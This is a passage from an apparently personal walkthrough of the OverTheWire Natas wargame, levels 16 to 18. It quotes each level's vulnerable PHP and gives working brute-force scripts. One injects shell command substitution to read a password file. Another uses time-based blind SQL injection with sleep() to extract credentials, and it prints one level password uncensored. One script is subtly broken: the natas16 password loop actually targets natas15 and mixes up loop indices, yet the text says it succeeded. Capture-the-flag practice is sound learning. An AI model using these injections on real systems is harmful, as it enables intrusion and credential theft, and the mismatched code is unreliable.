<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

Hey, this looks kinda familiar! Takes me all the way back to levels 9 and 10.

We're back to dictionary.txt, but this time, there's even filtering of characters. No semicolons... not much of a chance of executing a command. Or is there? What if instead of separating commands with a semicolon, we embed our command inside of grep?

Here's an example of what I'm thinking:

We query `whirlpools$(grep [character] /etc/natas_webpass/natas17)`, which to `passthru()` looks like:

`grep -i "whirlpools$(grep [character] /etc/natas_webpass/natas17)" dictionary.txt`

If "a" for example exists within the password, then nothing should be echoed back because "whirlpools" is unique in the dictionary. There's no such thing as "whirlpoolsa", therefore it should return nothing from the dictionary. But if "a" does not exist in the password, then nothing will be tacked onto "whirlpools", and "whirlpools" will be echoed back to us.

This is starting to look similar enough to the last one, I think we can reuse much of our PHP.

~~~~
<?php

function get($url)
{
    $username = "natas16";
    $password = "[censored]";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}

$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    //whirlpools$(grep a /etc/natas_webpass/natas17)
    $command = urlencode("whirlpools$(grep $character /etc/natas_webpass/natas17)");
    $r = get("http://natas16.natas.labs.overthewire.org/index.php?needle=$command");
    if (!strpos($r, "whirlpools"))
    {
        $library .= $character;
    }
}

var_dump($library);
~~~~

Outputs: `string(26) "bcdghkmnqrswAGHNPQSW035789"`

Heck yeah, it worked! Now we need to check each of these for the 32 positions of the password, just like last time.

~~~~
<?php

function post($url, $data)
{
    $username = "natas16";
    $password = "[censored]";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"%$character%\"#"]);
    if (strpos($r, "<br>This user exists.<br>"))
    {
        $library .= $character;
    }
}

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$i];
        $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"$password$character%\"#"]);
        if (strpos($r, "<br>This user exists.<br>"))
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}
~~~~
And once again, we watch the password build before our very eyes.


## Natas 17 🡆 Natas 18

~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas17</h1> 
<div id="content"> 
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Oh c'mon, now they're just playing hardball. Seriously? Commenting out all the echo statements? Well, no matter. We're smart, we can think of a way.

MySQL has a `sleep()` function... what if we injected some logic into our query, and told it to sleep for 5 seconds if it found something?

Something like: `natas18" AND IF(password LIKE BINARY "%a%", sleep(5), null) #`

Where "a" is the character we're testing, and if it's somewhere in "password", it sleeps... commenting out the rest of the SQL after our query, of course.

Let's rejig our PHP from a while ago to test this.

~~~~
<?php

function get($url)
{
    $username = "natas17";
    $password = "[censored]";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';


for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $query = urlencode("natas18\" AND IF(password LIKE BINARY \"%$character%\", sleep(5), null) #");
    $start = time();
    $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
    $end = time();
    if ($end - $start > 4)
    {
        $library .= $character;
    }
}

var_dump($library);
~~~~

In theory, this should give us our library. Let's run it.

`string(24) "dghjlmpqsvwxyCDFIKOPR047"`

Haha! We did it! Let's use the sleep strategy again, in the same loop we've been using for the past few challenges.

~~~~
<?php

function get($url)
{
    $username = "natas17";
    $password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';


for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $query = urlencode("natas18\" AND IF(password LIKE BINARY \"%$character%\", sleep(5), null) #");
    $start = time();
    $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
    $end = time();
    if ($end - $start > 4)
    {
        $library .= $character;
    }
}

var_dump($library);

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$j];
        $query = urlencode("natas18\" AND IF(password LIKE BINARY \"$password$character%\", sleep(5), null) #");
        $start = time();
        $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
        $end = time();
        if ($end - $start > 4)
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}
~~~~
Beautiful! I kinda like this little brute-forcer template I've written, it's coming in handy quite a bit in these challenges.


## Natas 18 🡆 Natas 19
~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas18</h1> 
<div id="content"> 
<? 

$maxid = 640; // 640 should be enough for everyone 

function isValidAdminLogin() { /* {{{ */ 
    if($_REQUEST["username"] == "admin") { 
    /* This method of authentication appears to be unsafe and has been disabled for now. */ 
        //return 1; 
    } 

    return 0; 
} 
/* }}} */ 
function isValidID($id) { /* {{{ */ 
    return is_numeric($id); 
} 
/* }}} */ 
function createID($user) { /* {{{ */ 
    global $maxid; 
    return rand(1, $maxid); 
} 
/* }}} */ 
function debug($msg) { /* {{{ */ 
    if(array_key_exists("debug", $_GET)) { 
        print "DEBUG: $msg<br>"; 
    } 
} 
/* }}} */ 
function my_session_start() { /* {{{ */ 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
    if(!session_start()) { 
        debug("Session start failed"); 
        return false; 
    } else { 
        debug("Session start ok"); 
        if(!array_key_exists("admin", $_SESSION)) { 
        debug("Session was old: admin flag set"); 
        $_SESSION["admin"] = 0; // backwards compatible, secure 
        } 
        return true; 
    } 
    } 

    return false; 
} 
/* }}} */ 
function print_credentials() { /* {{{ */ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas19\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
} 
/* }}} */ 

$showform = true; 
if(my_session_start()) { 
    print_credentials(); 
    $showform = false; 
} else { 
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) { 
    session_id(createID($_REQUEST["username"])); 
    session_start(); 
    $_SESSION["admin"] = isValidAdminLogin(); 
    debug("New session started"); 
    $showform = false; 
    print_credentials(); 
    } 
}  

if($showform) { 
?> 

<p> 
Please login with your admin account to retrieve credentials for natas19. 
</p> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Interesting. Looks like this one's all about sessions.